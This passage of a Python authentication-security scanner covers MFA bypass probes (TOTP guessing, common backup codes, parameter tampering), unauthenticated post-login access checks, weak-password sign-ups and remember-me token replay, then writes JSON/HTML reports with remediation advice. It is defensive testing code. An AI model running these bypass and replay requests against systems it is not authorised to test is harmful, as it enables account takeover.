                    if response.status_code in (200, 302, 301) and 'error' not in response.text.lower()[:500]:
                        self.add_vulnerability(AuthVulnerability(
                            name=f"SAML Assertion Manipulation - {assertion['name']}",
                            severity="CRITICAL",
                            confidence="TENTATIVE",
                            url=url,
                            description=f"SAML endpoint accepted manipulated assertion: {assertion['name']}",
                            evidence=f"Endpoint {endpoint} returned {response.status_code} for manipulated assertion",
                            remediation="Implement strict SAML validation: verify signatures, validate Issuer, check AudienceRestriction, enforce NotOnOrAfter.",
                            cwe="CWE-287",
                            cvss=9.0
                        ))
                except Exception:
                    pass

    def test_mfa_bypass(self) -> None:
        """Test 2FA/MFA bypass techniques."""
        print(f"\n{Colors.CYAN}[*] Testing MFA/2FA bypass techniques...{Colors.END}")

        mfa_endpoints = [
            '/mfa', '/mfa/verify', '/2fa', '/two-factor',
            '/api/mfa', '/api/2fa', '/auth/mfa', '/auth/2fa',
            '/mfa/validate', '/2fa/verify', '/totp',
        ]

        found_mfa = []
        for endpoint in mfa_endpoints:
            url = urljoin(self.base_url, endpoint)
            try:
                response = self.session.get(url, timeout=10, verify=False)
                if response.status_code != 404:
                    found_mfa.append(endpoint)
                    print(f"{Colors.GREEN}[+] Found MFA endpoint: {endpoint}{Colors.END}")
            except:
                pass

        if not found_mfa:
            print(f"{Colors.YELLOW}[!] No MFA endpoints discovered{Colors.END}")
            return

        # 1. Brute-force TOTP codes (check rate limiting)
        for endpoint in found_mfa:
            print(f"{Colors.CYAN}[*] Testing TOTP brute-force resistance on {endpoint}...{Colors.END}")
            responses = []
            for i in range(10):
                try:
                    url = urljoin(self.base_url, endpoint)
                    response = self.session.post(
                        url,
                        data={'code': f'{i:06d}', 'totp': f'{i:06d}'},
                        timeout=10,
                        verify=False
                    )
                    responses.append(response.status_code)
                except:
                    responses.append(0)

            if 429 not in responses and 403 not in responses:
                self.add_vulnerability(AuthVulnerability(
                    name="MFA - Missing Rate Limiting on TOTP",
                    severity="HIGH",
                    confidence="TENTATIVE",
                    url=urljoin(self.base_url, endpoint),
                    description="No rate limiting detected on TOTP verification, allowing brute-force attacks",
                    evidence=f"No 429/403 after 10 rapid TOTP attempts (codes: {set(responses)})",
                    remediation="Implement rate limiting and account lockout on TOTP verification. Use 30-second TOTP windows.",
                    cwe="CWE-307",
                    cvss=7.5
                ))

        # 2. Backup code abuse
        backup_codes = ['000000', '123456', '111111', '999999', '00000000', '12345678', '11111111']
        for endpoint in found_mfa:
            for code in backup_codes:
                try:
                    url = urljoin(self.base_url, endpoint)
                    response = self.session.post(
                        url,
                        data={'code': code, 'backup_code': code, 'backup': code},
                        timeout=10,
                        verify=False
                    )
                    if response.status_code in (200, 302) and 'invalid' not in response.text.lower() and 'error' not in response.text.lower() and ('success' in response.text.lower() or 'welcome' in response.text.lower()):
                        self.add_vulnerability(AuthVulnerability(
                            name="MFA - Weak/Guessable Backup Codes",
                            severity="HIGH",
                            confidence="FIRM",
                            url=url,
                            description=f"Common backup code '{code}' was accepted",
                            evidence=f"Backup code '{code}' returned non-error response on {endpoint}",
                            remediation="Generate cryptographically random backup codes. Rate-limit backup code attempts.",
                            cwe="CWE-330",
                            cvss=7.0
                        ))
                        break
                except:
                    pass

        # 3. Parameter manipulation bypass
        for endpoint in found_mfa:
            url = urljoin(self.base_url, endpoint)
            manipulation_tests = [
                {'name': 'Remove MFA Parameter', 'data': {}},
                {'name': 'Null MFA Value', 'data': {'mfa': 'null', 'code': 'null', 'mfa_code': 'null'}},
                {'name': 'Empty MFA Value', 'data': {'mfa': '', 'code': '', 'mfa_code': ''}},
                {'name': 'Boolean Bypass', 'data': {'mfa': 'false', 'mfa_required': 'false', 'verified': 'true'}},
                {'name': 'Array Bypass', 'data': {'mfa[]': '', 'code[]': ''}},
            ]
            for test in manipulation_tests:
                try:
                    response = self.session.post(url, data=test['data'], timeout=10, verify=False)
                    if response.status_code in (200, 302) and len(response.content) > 100:
                        redirect = response.headers.get('Location', '') if response.status_code == 302 else ''
                        if 'login' not in redirect.lower() and 'mfa' not in redirect.lower():
                            self.add_vulnerability(AuthVulnerability(
                                name=f"MFA Bypass via Parameter Manipulation - {test['name']}",
                                severity="CRITICAL",
                                confidence="TENTATIVE",
                                url=url,
                                description=f"MFA may be bypassed by manipulating request parameters: {test['name']}",
                                evidence=f"Request with {test['data']} returned {response.status_code}",
                                remediation="Enforce MFA server-side. Never trust client-provided MFA completion flags.",
                                cwe="CWE-603",
                                cvss=9.0
                            ))
                            break
                except:
                    pass

        # 4. Direct access to post-auth endpoints
        print(f"{Colors.CYAN}[*] Testing direct access to post-auth endpoints without MFA...{Colors.END}")
        post_auth_endpoints = [
            '/dashboard', '/profile', '/account', '/settings',
            '/api/user', '/api/profile', '/admin', '/api/admin',
        ]
        for endpoint in post_auth_endpoints:
            url = urljoin(self.base_url, endpoint)
            try:
                clean_session = requests.Session()
                clean_session.headers.update({'User-Agent': 'Mozilla/5.0'})
                if self.proxy:
                    clean_session.proxies = {'http': self.proxy, 'https': self.proxy}
                response = clean_session.get(url, timeout=10, verify=False)
                if response.status_code not in (401, 403, 302, 404):
                    self.add_vulnerability(AuthVulnerability(
                        name="MFA Bypass - Direct Post-Auth Access",
                        severity="HIGH",
                        confidence="TENTATIVE",
                        url=url,
                        description=f"Post-authentication endpoint '{endpoint}' accessible without completing MFA",
                        evidence=f"Endpoint returned {response.status_code} without MFA session",
                        remediation="Ensure all sensitive endpoints enforce MFA check server-side. Implement proper session authorization.",
                        cwe="CWE-862",
                        cvss=7.5
                    ))
            except:
                pass

    def test_password_policy(self) -> None:
        """Test password policy strength."""
        print(f"\n{Colors.CYAN}[*] Testing password policy...{Colors.END}")

        policy_endpoints = [
            '/register', '/signup', '/api/register', '/api/signup',
            '/api/auth/register', '/api/user/password', '/account/password',
            '/change-password', '/api/change-password',
        ]

        found_endpoints = []
        for endpoint in policy_endpoints:
            url = urljoin(self.base_url, endpoint)
            try:
                response = self.session.get(url, timeout=10, verify=False)
                if response.status_code != 404:
                    found_endpoints.append(endpoint)
            except:
                pass

        if not found_endpoints:
            print(f"{Colors.YELLOW}[!] No registration/password endpoints found{Colors.END}")
            try:
                response = self.session.get(self.login_url, timeout=10, verify=False)
                self._analyze_password_hints(response.text)
            except:
                pass
            return

        weak_passwords = ['a', 'aa', 'aaa', 'password', 'Password1!', 'Password123', 'P@ssw0rd', 'admin123']

        for endpoint in found_endpoints:
            print(f"{Colors.CYAN}[*] Testing password policy on {endpoint}...{Colors.END}")
            for pwd in weak_passwords:
                try:
                    url = urljoin(self.base_url, endpoint)
                    response = self.session.post(
                        url,
                        data={
                            'username': f'testuser_{random.randint(1000,9999)}',
                            'email': f'test_{random.randint(1000,9999)}@test.com',
                            'password': pwd,
                            'password_confirmation': pwd,
                            'confirm_password': pwd,
                        },
                        timeout=10,
                        verify=False
                    )
                    if response.status_code in (200, 201, 302):
                        self.add_vulnerability(AuthVulnerability(
                            name="Weak Password Policy",
                            severity="HIGH",
                            confidence="FIRM",
                            url=url,
                            description=f"Password policy allows weak password: '{pwd}' ({len(pwd)} chars)",
                            evidence=f"Password '{pwd}' accepted on {endpoint} with status {response.status_code}",
                            remediation="Enforce minimum 8 characters, mixed case, digits, and special characters. Implement password strength meter.",
                            cwe="CWE-521",
                            cvss=7.5
                        ))
                        break
                    self._analyze_password_hints(response.text)
                except:
                    pass

    def _analyze_password_hints(self, text: str) -> None:
        """Analyze response text for password policy hints."""
        text_lower = text.lower()

        min_lengths = []
        for pattern in [r'minimum\s*(?:of\s*)?(\d+)\s*(?:characters?|chars?)',
                        r'at\s*least\s*(\d+)\s*(?:characters?|chars?)',
                        r'(\d+)\s*(?:characters?|chars?)\s*(?:minimum|long)',
                        r'min[-_]?length[:\s]*(\d+)',
                        r'password.*(\d+).*character']:
            matches = re.findall(pattern, text_lower)
            min_lengths.extend(int(m) for m in matches)

        found_requirements = []
        if min_lengths:
            found_requirements.append(f"Minimum length: {max(min_lengths)}")
        if re.search(r'uppercase|capital\s*letter|[A-Z].*required', text):
            found_requirements.append("Uppercase required")
        if re.search(r'lowercase|small\s*letter|[a-z].*required', text):
            found_requirements.append("Lowercase required")
        if re.search(r'digit|number|numeric|[0-9].*required', text):
            found_requirements.append("Digit required")
        if re.search(r'special|symbol|non[- ]alphanumeric|[!@#$%^&\*]', text):
            found_requirements.append("Special character required")

        if found_requirements:
            print(f"{Colors.BLUE}[i] Password policy detected: {', '.join(found_requirements)}{Colors.END}")

    def test_remember_me(self) -> None:
        """Test remember-me / persistent token security."""
        print(f"\n{Colors.CYAN}[*] Testing remember-me / persistent token security...{Colors.END}")

        remember_patterns = [
            'remember', 'remember_me', 'remember-me', 'persist',
            'stay_logged', 'stay-signed', 'keep_logged',
            'token', 'refresh_token', 'auth_token',
        ]

        try:
            response = self.session.get(self.login_url, timeout=10, verify=False)
        except:
            return

        found_remember = []
        for name, value in self.session.cookies.get_dict().items():
            name_lower = name.lower()
            for pattern in remember_patterns:
                if pattern in name_lower:
                    found_remember.append(name)
                    print(f"{Colors.GREEN}[+] Remember-me token found: {name}={value[:20]}...{Colors.END}")
                    break

        if 'remember' in response.text.lower():
            print(f"{Colors.GREEN}[+] Remember-me checkbox found on login form{Colors.END}")

        if not found_remember and 'remember' not in response.text.lower():
            print(f"{Colors.YELLOW}[!] No remember-me functionality detected{Colors.END}")
            return

        # Test if remember-me tokens are persistent across sessions
        if found_remember:
            original_cookies = self.session.cookies.get_dict()

            for endpoint in ['/logout', '/signout', '/auth/logout', '/api/auth/logout']:
                try:
                    url = urljoin(self.base_url, endpoint)
                    self.session.post(url, timeout=10, verify=False)
                except:
                    pass

            for name in found_remember:
                if name in self.session.cookies.get_dict():
                    self.add_vulnerability(AuthVulnerability(
                        name="Remember-Me Token Not Invalidated on Logout",
                        severity="HIGH",
                        confidence="FIRM",
                        url=self.login_url,
                        description=f"Remember-me token '{name}' persists after logout",
                        evidence=f"Cookie '{name}' still present after logout request",
                        remediation="Invalidate remember-me tokens server-side on logout. Set short expiration on persistent tokens.",
                        cwe="CWE-613",
                        cvss=7.5
                    ))

            # Test token replay after logout
            for name in found_remember:
                if name in original_cookies:
                    try:
                        replay_session = requests.Session()
                        replay_session.headers.update({'User-Agent': 'Mozilla/5.0'})
                        if self.proxy:
                            replay_session.proxies = {'http': self.proxy, 'https': self.proxy}
                        replay_session.cookies.set(name, original_cookies[name])
                        replay_resp = replay_session.get(self.base_url, timeout=10, verify=False)
                        if replay_resp.status_code == 200 and 'login' not in replay_resp.url.lower() and 'login' not in replay_resp.text.lower()[:500]:
                                self.add_vulnerability(AuthVulnerability(
                                    name="Remember-Me Token Replay After Logout",
                                    severity="HIGH",
                                    confidence="FIRM",
                                    url=self.base_url,
                                    description=f"Remember-me token '{name}' can be replayed after logout",
                                    evidence=f"Replay with token {original_cookies[name][:20]}... returned {replay_resp.status_code} at {replay_resp.url}",
                                    remediation="Invalidate remember-me tokens on logout. Use token rotation. Bind tokens to IP/User-Agent.",
                                    cwe="CWE-613",
                                    cvss=7.0
                                ))
                                break
                    except:
                        pass

    def run_all_tests(self) -> AuthTestResult:
        """Run all authentication security tests."""
        print(f"\n{Colors.BOLD}{'='*70}{Colors.END}")
        print(f"{Colors.BOLD}AuthSecurityTester v{VERSION}{Colors.END}")
        print(f"{Colors.BOLD}Target: {self.base_url}{Colors.END}")
        print(f"{Colors.BOLD}{'='*70}{Colors.END}\n")
        
        # Run all tests
        self.test_account_enumeration()
        self.test_weak_passwords()
        self.test_brute_force_protection()
        self.test_session_security()
        self.test_cookie_security_flags()
        self.test_security_headers()
        self.test_jwt_security()
        self.test_password_reset_flaws()
        if self.test_oauth:
            self.test_oauth_flows()
        if self.test_saml:
            self.test_saml()
        if self.test_mfa:
            self.test_mfa_bypass()
        if self.test_password_policy:
            self.test_password_policy()
        self.test_remember_me()
        
        # Complete
        self.result.vulnerabilities = self.vulnerabilities
        self.result.end_time = datetime.now().isoformat()
        
        self.generate_report()
        
        return self.result
    
    def generate_report(self) -> None:
        """Generate JSON and HTML reports."""
        # JSON report
        json_path = os.path.join(self.output_dir, "auth_security_report.json")
        with open(json_path, 'w') as f:
            json.dump(self.result.to_dict(), f, indent=2)
        
        print(f"\n{Colors.GREEN}[+] JSON report saved: {json_path}{Colors.END}")
        
        # HTML report
        html_path = os.path.join(self.output_dir, "auth_security_report.html")
        self.generate_html_report(html_path)
        print(f"{Colors.GREEN}[+] HTML report saved: {html_path}{Colors.END}")
    
    def generate_html_report(self, filepath: str) -> None:
        """Generate HTML report."""
        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Authentication Security Test Report - {self.base_url}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }}
        .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; }}
        h1 {{ color: #333; border-bottom: 3px solid #007bff; padding-bottom: 10px; }}
        .summary {{ background: #f8f9fa; padding: 20px; border-radius: 5px; margin: 20px 0; }}
        .summary-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; }}
        .summary-item {{ text-align: center; padding: 15px; border-radius: 5px; }}
        .critical {{ background: #dc3545; color: white; }}
        .high {{ background: #fd7e14; color: white; }}
        .medium {{ background: #ffc107; color: black; }}
        .low {{ background: #28a745; color: white; }}
        .vulnerability {{ border: 1px solid #ddd; padding: 15px; margin: 10px 0; border-radius: 5px; }}
        .severity {{ font-weight: bold; padding: 3px 10px; border-radius: 3px; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🔐 Authentication Security Test Report</h1>
        <p><strong>Target:</strong> {self.base_url}</p>
        <p><strong>Login URL:</strong> {self.login_url}</p>
        
        <div class="summary">
            <h2>Executive Summary</h2>
            <div class="summary-grid">
                <div class="summary-item critical">
                    <h3>{len([v for v in self.result.vulnerabilities if v.severity == 'CRITICAL'])}</h3>
                    <p>CRITICAL</p>
                </div>
                <div class="summary-item high">
                    <h3>{len([v for v in self.result.vulnerabilities if v.severity == 'HIGH'])}</h3>
                    <p>HIGH</p>
                </div>
                <div class="summary-item medium">
                    <h3>{len([v for v in self.result.vulnerabilities if v.severity == 'MEDIUM'])}</h3>
                    <p>MEDIUM</p>
                </div>
                <div class="summary-item low">
                    <h3>{len([v for v in self.result.vulnerabilities if v.severity == 'LOW'])}</h3>
                    <p>LOW</p>
                </div>
            </div>
        </div>
        
        <h2>Detailed Findings</h2>
"""
        
        if not self.result.vulnerabilities:
            html += "<p style='color: #28a745; font-size: 16px;'>✅ No authentication vulnerabilities detected!</p>"
        else:
            for i, vuln in enumerate(self.result.vulnerabilities, 1):
                html += f"""
        <div class="vulnerability">
            <h3>#{i} {vuln.name}</h3>
            <span class="severity {vuln.severity.lower()}">{vuln.severity}</span>
            <p><strong>Description:</strong> {vuln.description}</p>
            <p><strong>Evidence:</strong> {vuln.evidence}</p>
            <p><strong>Remediation:</strong> {vuln.remediation}</p>
        </div>
"""
        
        html += """
    </div>
</body>
</html>
"""
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(html)


# =============================================================================
# COMMAND LINE INTERFACE
# =============================================================================

def main():
    parser = argparse.ArgumentParser(
        description='AuthSecurityTester - Authentication & Session Security Tester'
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target base URL')
    parser.add_argument('--login-path', default='/login', help='Login page path (default: /login)')
    parser.add_argument('--username-field', default='username', help='Username field name')
    parser.add_argument('--password-field', default='password', help='Password field name')
    parser.add_argument('--jwt-token', help='JWT token to analyze')
    parser.add_argument('-o', '--output', help='Output directory')
    parser.add_argument('--oauth', action='store_true', default=False, help='Run OAuth 2.0 / OIDC flow tests')
    parser.add_argument('--saml', action='store_true', default=False, help='Run SAML assertion manipulation tests')
    parser.add_argument('--mfa', action='store_true', default=False, help='Run MFA/2FA bypass tests')
    parser.add_argument('--password-policy', action='store_true', default=False, help='Run password policy tests')
    
    add_proxy_arg(parser)
    
    args = parser.parse_args()
    
    # If no specific test flags provided, run all tests (backward compatible)
    any_flag = args.oauth or args.saml or args.mfa or args.password_policy
    if not any_flag:
        args.oauth = args.saml = args.mfa = args.password_policy = True
    
    try:
        tester = AuthSecurityTester(
            base_url=args.url,
            login_path=args.login_path,
            username_field=args.username_field,
            password_field=args.password_field,
            output_dir=args.output,
            test_oauth=args.oauth,
            test_saml=args.saml,
            test_mfa=args.mfa,
            test_password_policy=args.password_policy,
            proxy=args.proxy
        )
        
        result = tester.run_all_tests()
        
        # Print summary
        print(f"\n{Colors.BOLD}{'='*70}{Colors.END}")
        print(f"{Colors.BOLD}Test Complete!{Colors.END}")
        print(f"{Colors.BOLD}{'='*70}{Colors.END}")
        print(f"Total Vulnerabilities: {len(result.vulnerabilities)}")
        print(f"  CRITICAL: {len([v for v in result.vulnerabilities if v.severity == 'CRITICAL'])}")
        print(f"  HIGH: {len([v for v in result.vulnerabilities if v.severity == 'HIGH'])}")
        print(f"  MEDIUM: {len([v for v in result.vulnerabilities if v.severity == 'MEDIUM'])}")
        print(f"  LOW: {len([v for v in result.vulnerabilities if v.severity == 'LOW'])}")
        
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Test interrupted{Colors.END}")
    except Exception as e:
        print(f"\n{Colors.RED}[ERROR]{Colors.END} {str(e)}")


if __name__ == '__main__':
    main()
